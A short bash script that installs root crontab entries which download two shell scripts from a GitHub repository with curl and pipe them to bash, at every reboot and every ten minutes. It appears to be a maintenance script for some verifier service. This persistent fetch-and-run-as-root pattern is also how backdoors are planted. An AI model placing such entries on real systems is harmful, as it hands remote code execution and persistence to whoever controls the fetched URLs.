#!/bin/bash
sudo su
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/pvrebo.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/pv10m.sh | bash
 " >> myverifier
sudo crontab myverifier
rm myverifier
